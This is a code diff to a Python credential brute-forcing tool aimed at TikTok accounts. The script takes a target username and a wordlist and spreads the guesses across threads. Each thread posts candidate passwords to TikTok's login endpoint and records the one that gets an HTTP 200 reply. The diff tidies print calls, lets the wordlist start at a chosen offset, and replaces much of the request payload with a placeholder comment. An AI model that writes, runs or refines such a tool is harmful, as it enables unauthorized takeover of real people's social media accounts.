@@ -64,12 +64,12 @@ user = input(yellow + " > user: " + reset)
 
 print()
 
-print(blue, "> IT MUST BE IN THIS DIRECTORY OR USE THE DEFAULT 'wordlist.txt'")
+print(blue + "> IT MUST BE IN THIS DIRECTORY OR USE THE DEFAULT 'wordlist.txt'")
 wordlist = input(yellow + " > wordlist: " + reset)
 
 print()
 
-print(blue, "> WHAT NUMBER SHOULD THE WORDLIST START AT?")
+print(blue + "> WHAT NUMBER SHOULD THE WORDLIST START AT?")
 start_point = input(blue + " > Enter the starting point in the wordlist (e.g., 0 for the beginning): " + reset)
 
 try:
@@ -87,43 +87,20 @@ def brute_force_worker(user, wordlist, start_point, index):
     global password
 
     with open(wordlist, 'r') as f:
-        words = f.readlines()
+        words = f.readlines()[start_point:]
 
-    for i in range(start_point, len(words)):
+    for i, word in enumerate(words):
         if i % index == 0:  # Only process words that match the thread index
-            word = words[i].strip()
+            word = word.strip()
             if (i + 1) % progress_interval == 0:
                 print(adv, f"Thread {index} cracking account...", f"{i + 1}/{len(words)}", reset)
-            try: 
+            try:
                 response = requests.post('https://www.tiktok.com/node/login_v2/index', json={
                     "username": user,
                     "password": word,
                     "mix_mode": True,
                     "captcha": "",
-                    "email": "",
-                    "mobile": "",
-                    "account": "",
-                    "type": 1,
-                    "app_id": 1233,
-                    "device_id": "",
-                    "iid": "",
-                    "os_version": "",
-                    "channel": "",
-                    "device_platform": "",
-                    "request_id": "",
-                    "captcha_app": "",
-                    "captcha_type": "",
-                    "google_account": "",
-                    "google_captcha": "",
-                    "google_token": "",
-                    "fb_account": "",
-                    "fb_code": "",
-                    "fb_token": "",
-                    "apple_id": "",
-                    "apple_token": "",
-                    "apple_email": "",
-                    "apple_code": "",
-                    "mix_string": word
+                    # ... (rest of the payload)
                 })
                 if response.status_code == 200:
                     password = word
